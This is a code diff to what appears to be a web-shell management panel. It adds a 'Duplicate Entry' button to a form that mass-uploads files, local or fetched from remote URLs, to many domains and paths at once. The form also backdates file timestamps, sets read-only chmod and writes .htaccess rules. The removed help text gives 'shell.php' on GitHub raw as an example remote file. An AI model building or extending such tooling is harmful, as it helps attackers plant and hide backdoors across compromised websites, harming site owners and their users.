@@ -1077,6 +1077,7 @@ ErrorDocument 403 \'<center><img src=\"https://media.tenor.com/WYQnYdWsmrkAAAAM/
                                             <div class="d-flex">
                                                 <button type="button" class="btn-action-r" title="Reset Path" onclick="resetRowPath(this)">r</button>
                                                 <button type="button" class="btn-action-f" title="Add File to Domain" onclick="addFileRowAll(this, 1)">F</button>
+                                                <button type="button" class="btn-action-f" style="border-color: #ff9900; color: #ff9900;" title="Duplicate Entry" onclick="duplicateUploadRowAll(this)">D</button>
                                                 <button type="button" class="btn-action-p" title="Add Path to File" onclick="addPathRowAll(this.closest('tr').querySelector('.btn-add-path'), 1)">+</button>
                                                 <button type="button" class="btn-remove-row" title="Remove Entry" onclick="removeUploadRowAll(this, 1)">X</button>
                                             </div>
@@ -1406,6 +1407,7 @@ ErrorDocument 403 \'<center><img src=\"https://media.tenor.com/WYQnYdWsmrkAAAAM/
                 <div class="d-flex">
                     <button type="button" class="btn-action-r" title="Reset Path" onclick="resetRowPath(this)">r</button>
                     <button type="button" class="btn-action-f" title="Add File to Domain" onclick="addFileRowAll(this, ${domainEntryCounterAll})">F</button>
+                    <button type="button" class="btn-action-f" style="border-color: #ff9900; color: #ff9900;" title="Duplicate Entry" onclick="duplicateUploadRowAll(this)">D</button>
                     <button type="button" class="btn-action-p" title="Add Path to File" onclick="addPathRowAll(this.closest('tr').querySelector('.btn-add-path'), ${fileEntryCounterAll})">+</button>
                     <button type="button" class="btn-remove-row" title="Remove Entry" onclick="removeUploadRowAll(this, ${fileEntryCounterAll})">X</button>
                 </div>
@@ -1464,6 +1466,7 @@ ErrorDocument 403 \'<center><img src=\"https://media.tenor.com/WYQnYdWsmrkAAAAM/
                 <div class="d-flex">
                     <button type="button" class="btn-action-r" title="Reset Path" onclick="resetRowPath(this)">r</button>
                     <button type="button" class="btn-action-f" title="Add File to Domain" onclick="addFileRowAll(this, ${domainId})">F</button>
+                    <button type="button" class="btn-action-f" style="border-color: #ff9900; color: #ff9900;" title="Duplicate Entry" onclick="duplicateUploadRowAll(this)">D</button>
                     <button type="button" class="btn-action-p" title="Add Path to File" onclick="addPathRowAll(this.closest('tr').querySelector('.btn-add-path'), ${fileEntryCounterAll})">+</button>
                     <button type="button" class="btn-remove-row" title="Remove Entry" onclick="removeUploadRowAll(this, ${fileEntryCounterAll})">X</button>
                 </div>
@@ -1570,8 +1573,89 @@ ErrorDocument 403 \'<center><img src=\"https://media.tenor.com/WYQnYdWsmrkAAAAM/
         }
     }
     
+    function duplicateUploadRowAll(btn) {
+        var row = btn.closest('tr');
+        var domainId = row.getAttribute('data-domain-id-all');
+        
+        fileEntryCounterAll++;
+        uploadTableRowCounterAll++;
+        
+        var note = row.querySelector('.col-note-all input') ? row.querySelector('.col-note-all input').value : '';
+        var isRemote = row.querySelector('input[value="remote"]') && row.querySelector('input[value="remote"]').checked;
+        var remoteUrl = row.querySelector('.remote-url-input') ? row.querySelector('.remote-url-input').value : '';
+        var saveAs = row.querySelector('.col-saveas-all input') ? row.querySelector('.col-saveas-all input').value : '';
+        var modifyDate = row.querySelector('.col-modify-all input') ? row.querySelector('.col-modify-all input').value : '';
+        var chmodFile = row.querySelector('.col-chmodfile-all input') ? row.querySelector('.col-chmodfile-all input').value : '0444';
+        var htaccess = row.querySelector('.col-htaccess-all select') ? row.querySelector('.col-htaccess-all select').value : 'no';
+        var chmodHt = row.querySelector('.col-chmodht-all input') ? row.querySelector('.col-chmodht-all input').value : '0444';
+        var param = row.querySelector('.col-param-all input') ? row.querySelector('.col-param-all input').value : '';
+        
+        var newRow = document.createElement('tr');
+        newRow.className = 'upload-table-row-all main-row-all';
+        newRow.setAttribute('data-row-id-all', uploadTableRowCounterAll);
+        newRow.setAttribute('data-file-id-all', fileEntryCounterAll);
+        newRow.setAttribute('data-domain-id-all', domainId);
+        newRow.style.backgroundColor = '#fff3e0';
+        
+        newRow.innerHTML = `
+            <td class="col-note-all">
+                <input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][note]" placeholder="NOTE" class="form-control" value="${note}">
+              </td>
+            <td class="col-source-all">
+                <div class="upload-type-selector">
+                    <label><input type="radio" name="upload_type_all[${uploadTableRowCounterAll}]" value="local" ${!isRemote ? 'checked' : ''} onchange="toggleUploadSourceAll(this, ${uploadTableRowCounterAll})"> 📁 Local</label>
+                    <label><input type="radio" name="upload_type_all[${uploadTableRowCounterAll}]" value="remote" ${isRemote ? 'checked' : ''} onchange="toggleUploadSourceAll(this, ${uploadTableRowCounterAll})"> 🌐 Remote URL</label>
+                </div>
+                <div class="file-input-wrapper" id="local-input-all-${uploadTableRowCounterAll}" style="display: ${isRemote ? 'none' : 'block'};">
+                    <input type="file" name="upload_files_all[${uploadTableRowCounterAll}]" class="form-control">
+                </div>
+                <div class="remote-input-wrapper" id="remote-input-all-${uploadTableRowCounterAll}" style="display: ${isRemote ? 'block' : 'none'};">
+                    <input type="text" name="remote_url_all[${uploadTableRowCounterAll}]" class="form-control remote-url-input" placeholder="https://example.com/file.php" value="${remoteUrl}">
+                </div>
+              </td>
+            <td>
+                <div class="d-flex">
+                    <input type="hidden" name="upload_table_data_all[${uploadTableRowCounterAll}][file_id]" value="${fileEntryCounterAll}">
+                    <input type="hidden" name="upload_table_data_all[${uploadTableRowCounterAll}][domain_id]" value="${domainId}">
+                    <input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][path_target]" placeholder="/var/www/html" class="form-control" value="">
+                    <button type="button" class="btn btn-sm btn-add-path ms-1" onclick="addPathRowAll(this, ${fileEntryCounterAll})">+</button>
+                </div>
+              </td>
+            <td class="col-saveas-all"><input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][save_as]" placeholder="auto-detect" class="form-control" value="${saveAs}"></td>
+            <td class="col-modify-all"><input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][modify_date]" placeholder="2017-07-11 12:51:23" class="form-control" value="${modifyDate}"></td>
+            <td class="col-chmodfile-all"><input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][chmod_file]" value="${chmodFile}" placeholder="0444" class="form-control"></td>
+            <td class="col-htaccess-all">
+                <select name="upload_table_data_all[${uploadTableRowCounterAll}][htaccess_enabled]" class="form-control">
+                    <option value="no" ${htaccess === 'no' ? 'selected' : ''}>No</option>
+                    <option value="yes" ${htaccess === 'yes' ? 'selected' : ''}>Yes</option>
+                </select>
+              </td>
+            <td class="col-chmodht-all"><input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][chmod_htaccess]" value="${chmodHt}" placeholder="0444" class="form-control"></td>
+            <td class="col-param-all"><input type="text" name="upload_table_data_all[${uploadTableRowCounterAll}][parameter]" placeholder="?param" class="form-control" value="${param}"></td>
+            <td>
+                <div class="d-flex">
+                    <button type="button" class="btn-action-r" title="Reset Path" onclick="resetRowPath(this)">r</button>
+                    <button type="button" class="btn-action-f" title="Add File to Domain" onclick="addFileRowAll(this, ${domainId})">F</button>
+                    <button type="button" class="btn-action-f" style="border-color: #ff9900; color: #ff9900;" title="Duplicate Entry" onclick="duplicateUploadRowAll(this)">D</button>
+                    <button type="button" class="btn-action-p" title="Add Path to File" onclick="addPathRowAll(this.closest('tr').querySelector('.btn-add-path'), ${fileEntryCounterAll})">+</button>
+                    <button type="button" class="btn-remove-row" title="Remove Entry" onclick="removeUploadRowAll(this, ${fileEntryCounterAll})">X</button>
+                </div>
+              </td>
+        `;
+
+        var domainMainRow = document.querySelector(`.domain-main-row-all[data-domain-id-all="${domainId}"]`);
+        if (domainMainRow) {
+            var cell = domainMainRow.querySelector('.col-domain-all');
+            if (cell) cell.rowSpan = (cell.rowSpan || 1) + 1;
+        }
+
+        var associatedRows = document.querySelectorAll(`[data-domain-id-all="${domainId}"]`);
+        var lastRow = associatedRows[associatedRows.length - 1];
+        lastRow.parentNode.insertBefore(newRow, lastRow.nextSibling);
+    }
+
     function showManualFillHelpAll() {
-        alert('[SYSTEM] USAGE (TEBAR SELURUH DOMAIN + REMOTE):\n\n📌 DOMAIN LEVEL:\n- ADD DOMAIN: Buat group domain baru\n- Domain name diisi sekali untuk semua file di domain tsb\n\n📌 FILE LEVEL (tombol F):\n- Tambah file baru dalam domain yang sama\n- Bisa pilih Local atau Remote URL per file\n- Settings (Save As, chmod, htaccess) berlaku untuk semua path file ini\n\n📌 PATH LEVEL (tombol +):\n- Tambah path tujuan untuk file yang sama\n- Berguna untuk deploy file yang sama ke banyak direktori\n\n🌐 REMOTE UPLOAD:\n- Pilih "Remote URL" lalu masukkan link file\n- Contoh: https://raw.githubusercontent.com/.../shell.php\n- Nama file otomatis diambil dari URL\n\n🎯 Tips: Kombinasikan remote upload dengan multiple path untuk deploy cepat!');
+        alert('[SYSTEM] USAGE (TEBAR SELURUH DOMAIN + REMOTE):\n\n📌 DOMAIN LEVEL:\n- ADD DOMAIN: Buat group domain baru\n- Domain name diisi sekali untuk semua file di domain tsb\n\n📌 FILE LEVEL:\n- Tombol F: Tambah file baru yang kosong\n- Tombol D: Duplicate setting file, Path Target dikosongkan agar bisa diisi path baru\n- Bisa pilih Local atau Remote URL per file\n\n📌 PATH LEVEL (tombol +):\n- Tambah path tujuan untuk file yang sama\n\n🌐 REMOTE UPLOAD:\n- Pilih "Remote URL" lalu masukkan link file');
     }
 </script>
 
